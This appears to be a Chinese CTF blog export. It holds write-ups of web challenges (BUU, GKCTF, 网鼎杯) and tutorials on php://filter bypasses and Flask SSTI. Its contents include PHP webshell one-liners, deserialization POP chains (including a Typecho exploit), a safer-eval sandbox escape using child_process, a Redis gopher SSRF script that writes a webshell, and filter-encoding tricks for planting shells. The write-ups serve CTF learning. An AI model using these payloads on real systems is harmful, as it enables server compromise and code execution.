change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; 其中对IP进行了一次check，XFF不可用，用Clinet-IP即可绕过 之后看上面的简单函数的逆向，把加号改成减号就行了 1234567891011121314151617181920&lt;?php$v = &quot;fj]a&amp;f\\b&quot;;function unchange($v)&#123; $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) - $i*2 ); &#125; return $re;&#125;function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re;&#125;echo (change(&quot;ZmpdYSZmXGI=&quot;)); 比较恶心到人的是2333的输出，我之前无论如何输入都不行，一度怀疑人生，最后找到data的伪协议可以绕过，参考文章： 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;nzjdsds&#x2F;article&#x2F;details&#x2F;82461043 最后成功拿到flag，flag在源码中： 2.你传你🐎呢分别上传.htaccess和一句话即可： 一句话用asp的格式： 1&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt; 之后用蚁剑🔗拿flag即可，这道题我比较奇怪的就是过滤了很多东西，但是又没啥用,我猜测是出题人过滤不够？不然可以用disable_function的来做的,过滤如下：k’h’j 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld 3.Ez_bypassMD5强等于绕过和弱等于绕过： 当然也可以用下面这两组数： 123hexString1 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;hexString2 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27; 第二步； 4.PYWebsite 看到这句话，直接伪造XFF即可 5.Ezpop首先审计源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 我自己审计的时候感觉有点懵，首先我们可能要用到的是include这么一个函数，而var函数会在__invoke的时候去调用$var，进行文件包含，于是我们构造如下： 1$var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;; 接着就是去找哪里可以调用到这么一个__invoke方法了，根据PHP的手册，我们会在 函数被当成方法调用的时候自动调用，例子如下： 123$mod = new Modifier();$mod();//在下面则会自动调用invoke方法 往下看就能看见Test方法，因为它返回了一个function。所以让Test去get 一下Modifier类，就会先调用__get方法，结果因为被当成了函数进行调用，我们的Modifier类自动的调用了invoke方法。 然后我卡在这里好久..最后看了师傅们的博客才想到该怎么写..说实话还是有点懵逼 1234567891011 public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125; 在show函数当中，我们需要找到__wakeup函数，因为它进行了echo操作，此时便会触发string函数 修改source的值。 最后要注意protected属性修饰的变量应该用urlencode进行修饰避免不可见字符 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass Modifier &#123; protected $var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; &#125; public function __wakeup()&#123;// phpinfo(); if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p;// private $c; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123;// phpinfo(); $function = $this-&gt;p; return $function(); &#125;&#125;$test = new Test();$mod = new Modifier();$show1 = new Show();$show1 -&gt;str =$test;$show1-&gt;str-&gt;p = $mod;$show2 = new Show($show1);echo urlencode(serialize($show2));//当我们触发 这里就是进行了一个套娃，当反序列化的时候呢，show方法被反序列化，调用了wakeup的函数，之后又因为 __construct,进行了一句输出，所以就造成了toString调用，在此之前我们构造好语句即可 $show2 纯粹的是进行一次wakeup调用！ 6.Ezadult页面啥也看不出来，直接www.zip下了一波代码，之后发现是伪随机数爆破，构造两个脚本： 123456789101112str1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;str2 = &#x27;KVQP0LdJKRaV3n9D&#x27;str3 = str1[::-1]res = &#x27;&#x27;for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res += str(j) + &#x27; &#x27; + str(j) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + str(len(str1) - 1) + &#x27; &#x27; breakprint(res)#结果 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 下载php_mt_rand那个脚本，使用教程： 记得用make编译c语言的东西，之后./运行即可： 跑出公钥来：1775196155 12345678910111213141516171819202122&lt;?phpmt_srand(1775196155);//公钥function public_key($length = 16) &#123; $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $public_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key;&#125;//私钥function private_key($length = 12) &#123; $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $private_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key;&#125;echo public_key();echo private_key();?&gt; 之后密码用万能密码一过，即可得到flag 后面的两个一个太难一个是题目down掉了完全用不了。。","categories":[],"tags":[]},{"title":"2020网鼎杯phpweb","slug":"2020网鼎杯phpweb","date":"2020-10-28T11:19:40.000Z","updated":"2020-11-17T06:15:44.475Z","comments":true,"path":"2020/10/28/2020网鼎杯phpweb/","link":"","permalink":"http://example.com/2020/10/28/2020%E7%BD%91%E9%BC%8E%E6%9D%AFphpweb/","excerpt":"","text":"1.访问页面curl+u，可以查看到这些： 1234&lt;form id=form1 name=form1 action=&quot;index.php&quot; method=post&gt; &lt;input type=hidden id=func name=func value=&#x27;date&#x27;&gt; &lt;input type=hidden id=p name=p value=&#x27;Y-m-d h:i:s a&#x27;&gt;&lt;/body&gt; 这样的话我们推测它就是用了一个call_user_func的回调函数.. 然后自己在这里卡了很久，最后才想起来file_get_contents函数可以读文件， 于是构造： 得到源码 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; 之后我又卡住了，看似好像是反序列化，又好像不是啊？找不到反序列化的点，一时间又僵住了，过了一会儿看了大佬的WP才意识到是自己思路还不够灵活，这道题没有unserialize，但是可以动调函数，审计代码中的Test类，其实他是有gettime的，这个函数就是一个动调函数，那我们的思路就很明确 2.构造payload1234567891011121314&lt;?phpclass Test &#123; var $p = &quot;ls&quot;; var $func = &quot;system&quot;;// function __destruct() &#123;// if ($this-&gt;func != &quot;&quot;) &#123;// echo gettime($this-&gt;func, $this-&gt;p);// &#125;// &#125;&#125;$test = new Test();echo (serialize($test)); 之后将这一段带入到题目当中，最终在tmp目录下找到","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"GKCTF","slug":"GKCTF","date":"2020-10-27T08:04:11.000Z","updated":"2020-11-17T06:17:52.979Z","comments":true,"path":"2020/10/27/GKCTF/","link":"","permalink":"http://example.com/2020/10/27/GKCTF/","excerpt":"","text":"抽空把GKCTF的题目刷了，先从第一题开始说吧 1.Check in说是一道签到题，但是得用到pwn的知识【虽然exp直接就能打了 第一步访问就能审计到代码： 1234567891011121314151617181920&lt;?php highlight_file(__FILE__);class ClassName&#123; public $code = null; public $decode = null; function __construct() &#123; $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;]; $this-&gt;decode = @base64_decode( $this-&gt;code ); @Eval($this-&gt;decode); &#125; public function x() &#123; return $_REQUEST; &#125;&#125;new ClassName(); 就是一个很简单的序列化，我们直接base64编码Ginkgo之后的值即可。 1?Ginkgo=cGhwaW5mbygpOw== 审计到PHP的代码，下一步我们会发现自己蚁剑连接不上，没办法，只能自己再写一个shell了 1?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA== 密码是sakani，之后就可以用蚁剑链接上去了，但是我们发现flag没法读啊。而且因为disable_function，我们 没有办法使用虚拟终端了。 但是我们查看版本，版本为PHP7.3，可以尝试用内核漏洞提权，在tmp目录（777），上传exp 1https://github.com/mm0r1/exploits 上传这里的gc漏洞，之后执行命令即可 2.老八小超市儿根据这篇文章可以做出来前半段成功拿到shell： 1https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html 这里我传入成功之后路径为： 1http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php 用蚁剑连入，根目录下找到flag却不能读，读atuo.sh可以知道它每分钟会执行一次makeflaghint.py，同时其权限是766，也就是说我们可以改~，那我们去改这个py的内容让他读flag即可，等一分钟，读到flag 3.EzNode就是一个很基础的代码审计： 12345678910111213141516171819202122232425262728app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 老板说为了后期方便优化app.use((req, res, next) =&gt; &#123; if (req.path === &#x27;/eval&#x27;) &#123; let delay = 60 * 1000; console.log(delay); if (Number.isInteger(parseInt(req.query.delay))) &#123; delay = Math.max(delay, parseInt(req.query.delay)); &#125; const t = setTimeout(() =&gt; next(), delay); // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事 setTimeout(() =&gt; &#123; clearTimeout(t); console.log(&#x27;timeout&#x27;); try &#123; res.send(&#x27;Timeout!&#x27;); &#125; catch (e) &#123; &#125; &#125;, 1000); &#125; else &#123; next(); &#125;&#125;); 注意核心代码在worker2到worker3之间，我们发现如果delay被设置成了60*1000 而超时是1000.如果没有超时，反而会next，也就是会继续执行代码，否则直接弹回去超时，于是我们看下一步 123456789101112app.post(&#x27;/eval&#x27;, function (req, res) &#123; let response = &#x27;&#x27;; if (req.body.e) &#123; try &#123; response = saferEval(req.body.e); &#125; catch (e) &#123; response = &#x27;Wrong Wrong Wrong!!!!&#x27;; &#125; &#125; res.send(String(response));&#125;); 下面使用了saferEval的代码，接收e的参数，于是我们的目标很清晰，首先尝试绕过对超时的限制，再搜一下saferEval的数据~，文档说到： 1parseInt(string, radix) 参数 描述 string 必需。要被解析的字符串。 radix 可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN。 这也就说明，如果传入delay是很大很大的数，也就不能被解析了，那我们的delay此时变成了1秒，也就绕过了超时限制，接下来我们就可以命令执行咯，尝试： 发现此时就绕过了超时的限制了！，于是再构造执行EvalSafer的代码，查到是CVE-2019-10769 1https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10 payload如下： 123456789const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123; const process = clearImmediate.constructor(&quot;return process;&quot;)(); return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted)); 其中核心代码就是theFunction，我们传入进去污染参数即可执行代码 4.EzWeb是一个redis的题目..没有做过这样的，硬着头皮做吧，访问之后根据提示访问 ?secret 查询了一些，这是内网的环境，也就是说虽然题目过滤了127.0.0.1,但是我们可以测试其他靶机的内容 访问过去之后好像也不是啥玩意儿啊,尝试用file协议的漏洞读到了index.php的源码： file:[空格]/ 1?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;提交 123456789101112131415161718192021222324&lt;!--?secret--&gt;&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; //echo $url.&quot;\\n&quot;; if(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match)) &#123; //var_dump($match); die(&#x27;别这样&#x27;); &#125; curl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123; system(&#x27;ifconfig&#x27;);&#125;?&gt; 我们发现过滤了dict协议，file协议，但是没有过滤http协议和gopher协议，我们猜想出题人想让我们利用http协议进行内网探测，gopher协议进行攻击,果然，在11端口上找到了变化 让我们尝试服务，因为ssrf常用的几个服务就是mysql和redis，于是分别访问3306端口和6379端口 6379上得到： 发现果然有ERR端口，于是尝试用gopher协议打一波，这里直接用了一波别人的脚本 1234567891011121314151617181920212223242526272829303132import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.96.119.11&quot; // 运行有redis的主机ipport=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload 我们改一下主机IP为:10.160.187.11 得到payload: 1gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 5.EZ三剑客-EzTypecho这道题目，呃，原理比较难，但是利用起来却很简单，比如在这篇文章中可以找到： 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html exp就可以找到了，在做题的时候直接在finish时会发现无法利用的情况 这个时候就必须看源码了 查找session，在源码中可以找到： 12345678910 &lt;?php else : ?&gt; &lt;?php//if(!isset($_SESSION)) &#123; die(&#x27;no, you can\\&#x27;t unserialize it without session QAQ&#x27;);&#125; $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); Typecho_Cookie::delete(&#x27;__typecho_config&#x27;); $db = new Typecho_Db($config[&#x27;adapter&#x27;], $config[&#x27;prefix&#x27;]); $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); Typecho_Db::set($db); ?&gt; 我们去查找sesion在哪里赋值： 结果发现一旦在这里就被exit停下来了，于是查找start，结果发现源码当中： 1234&lt;?php $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); $type = explode(&#x27;_&#x27;, $config[&#x27;adapter&#x27;]); $type = array_pop($type); 发现它居然接收一个参数…那这样的话我们用这个去打就行了，利用脚本： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Typecho_Feed&#123; private $_type; private $_items = array(); public function __construct()&#123; $this-&gt;_type = &quot;RSS 2.0&quot;; $this-&gt;_items = array( array( &quot;title&quot; =&gt; &quot;test&quot;, &quot;link&quot; =&gt; &quot;test&quot;, &quot;data&quot; =&gt; &quot;20190430&quot;, &quot;author&quot; =&gt; new Typecho_Request(), ), ); &#125;&#125;class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __construct()&#123; $this-&gt;_params = array( &quot;screenName&quot; =&gt; &quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;, ); $this-&gt;_filter = array(&quot;assert&quot;); &#125;&#125;$a = new Typecho_Feed();$c = array( &quot;adapter&quot; =&gt; $a, &quot;prefix&quot; =&gt; &quot;test&quot;,);echo base64_encode(serialize($c)); 拿到flag： 总结：​ 题目虽然原理都很难，但是利用却很简单，自己先把题目成功的复现接出来了，以后再逐步复现原理把。","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"渗透","slug":"渗透","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"nodejs","slug":"nodejs","permalink":"http://example.com/tags/nodejs/"}]},{"title":"全国工控2020-web-easyphp","slug":"全国工控2020-web-easyphp","date":"2020-10-27T06:25:53.000Z","updated":"2020-11-17T06:15:26.691Z","comments":true,"path":"2020/10/27/全国工控2020-web-easyphp/","link":"","permalink":"http://example.com/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/","excerpt":"","text":"全国工控2020-web-easyphp1.从伪协议开始说起php://filter是PHP中独有的协议，该协议流允许我们作为一个中间流来处理其他流， 在之前三个白帽中有一个比赛，其中一部分的代码： 1234&lt;?php$content = &#x27;&lt;?php exit; ?&gt;&#x27;;$content .= $_POST[&#x27;txt&#x27;];file_put_contents($_POST[&#x27;filename&#x27;], $content); 1.base64在这里我们可以看见，如果正常的编译代码，由于在开头加入了exit内容，即使我们写入了一句话也无法解析。 但是我们可以通过filename在php写入的时候构造协议，所以利用base64-decode方法解码构造一句话的payload： 1PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D; 但是在这里我们又会发现如果直接打入进去，base64解析没有成功，这就是因为base是由4字节组成一次payload。所以话说回去， 当我们使用base64decode协议的时候，&lt; ? ; ?&gt;等等都不会被解析，所以源代码则会被识别为： phpexit，而base64是四个字节还原成一个字母，故我们需要再占一个位数，给她，也就是phpexit[?]构造成八个字节供basedecode使用，之后在后面再编上我们自己的payload，所以这道题可以构造如下： 1filename=php://filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg== 但是这里仍需要注意，我们构造的时候payload当中不允许出现+号等特殊字符，否则会遇见没有被写上去情况。，实际上，除了base过滤器，还有很多过滤器可以供给我们使用： 官网： 123https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php 过滤器https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php 转换过滤器https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php 字符过滤器 2.rot13除此之外我尝试使用rot13来绕过，但是会发现rot13之后的结果不合法 1filename=php://filter/write=string.rot13/resource=shell.php&amp;txt=&lt;?cuc cucvasb();?&gt; 得到php为： 1&lt;?cuc rkvg; ?&gt;&lt;?php phpinfo();?&gt; 这样的话，因为多了一个分号，而导致失败了（开启短标签的情况下，只要用&lt;? ?&gt;中的内容就会被解析）但如果关闭短标签的情况下： 1txt=?&gt;&lt;?cuc cucvasb();?&gt;&amp;filename=php://filter/write=string.rot13/resource=shell.php 成功！除此之外，还补充一种骚思路： 3.iconv字符编码转换1echo iconv(&quot;utf-8&quot;,&quot;utf-7&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;) iconv函数接收三个参数，当前编码，转换后编码，之后再转回去，所以利用该特性，我们可以反其道行之。但是在这里，利用该字符编码，会导致出现之前的+号的问题，于是就失败了 1filename=php://filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4- 根据大佬给出的UCS2-2 编码的方式： 1echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php phpinfo();?&gt;&#x27;); 需要注意的是，UCS2的编码方式是2位一次转换，所以我们必须保证需要转换的编码为2位数，不够的我们可以使用空格占位,而我们上面的转换之后直接用的话，会发现无法转换，这是因为必须保证&lt;?php exit();也被成功转换，所以我们再前面再加上一个1即可， 最终payload： 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;? 写入shell： 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;? 4.组合使用： 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;? 还可以尝试使用srtip_tags+base64的方式进行绕过 1filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg== 经过该方式构造的payload，会进行strip_tags，去除掉了前面的内容，之后再用base64解压了我们的内容。 讲完上面的，再回到wmctf的check in2，题目的源码为： 123456789101112&lt;?phperror_reporting(0);highlight_file(__FILE__);if (isset($_GET[&#x27;content&#x27;])) &#123; $content = $_GET[&#x27;content&#x27;]; if (preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\\.\\./i&#x27;, $content)) die(&#x27;hacker&#x27;); if (file_exists($content)) require_once($content); file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);&#125; 过滤器过滤了很多，我们只剩下了压缩过滤器，我们可以通过zlib.inflate解压字符，之后再利用zlib.deflate压缩的方式getshell，str.tolower会在 1php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt; 除此之外，还有二次编码绕过的方式 1http://localhost/?content=php://filter/write=string.%7%32ot13|?&gt;&lt;?cuc cucvasb();?&gt;|/resource=shell.php 而昨天的比赛过滤了tolower,upper等等，甚至又把%过滤了，导致我们没法用上面两个payload了，但是我们依然可以利用zlib的 deflate，之后再利用url编码解析，得出如下payload 123php://filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource=shell.php","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"FlaskSSti","slug":"FlaskSSti","date":"2020-10-27T06:01:27.000Z","updated":"2021-03-27T12:33:56.138Z","comments":true,"path":"2020/10/27/FlaskSSti/","link":"","permalink":"http://example.com/2020/10/27/FlaskSSti/","excerpt":"一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做","text":"一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做 1.hackbar 自带的payload如何构成的第一件事情，就是搭建我们的环境： 123456789101112131415from flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index(): id = request.args.get(&quot;id&quot;) html = &#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27; % (id) return render_template_string(html)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) 这种就是最基本的flask，在flask当中jinjia的模板，我们使用两个花括号就可以允许一些基本的运算 用于执行if，for循环等等，那么我们一个最基本的payload的构造方式是该怎么触发呢？第一步，从config类触发，因为Flask里面自带 1http://localhost/?id=&#123;&#123; config.items() &#125;&#125; 通过这个类我们可以得到所有的flask的config~，而这一的意义好像不是很大？我们得不到很多东西，但是我们可以用这个作为跳板，执行下一步 1.__class__.__init__ __class方法属性的时候会只想该实例对应的类，此时config的类是Config,然后可以再去调用其它类属性，如果我们审计了源码，就可以知道我们此时的Config类位于config.py80多行，当我们执行__init__之后，便可以在下面的101行找到这么一行代码： 1rv = os.environ.get(variable_name) 也就是说，我们的config类当中含有os库的方法，如果我们直接使用是不行的，但我们可以通过globals函数先获取到它，于是得到： globals() 函数会以字典类型返回当前位置的全部全局变量,在交互模式下： 1__globals__ 于是我们拼接得到如下的payload: 1config.__class__.__init__.__globals__ 可以得到： 我们用下面这个方式来获取os库，利用__dict这个方法来查看os库哪些可以给我们进行使用 1.__globals__[&#x27;os&#x27;] 